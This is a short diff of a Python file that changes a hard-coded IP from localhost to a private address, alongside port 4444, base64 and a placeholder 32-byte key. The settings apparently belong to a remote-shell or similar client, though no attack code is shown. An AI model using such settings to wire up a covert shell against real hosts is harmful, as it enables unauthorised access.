@@ -1,6 +1,6 @@
 import base64
 
-ip="localhost" 
+ip="192.168.100.10" 
 port="4444" 
 key = b"X" * 32
 
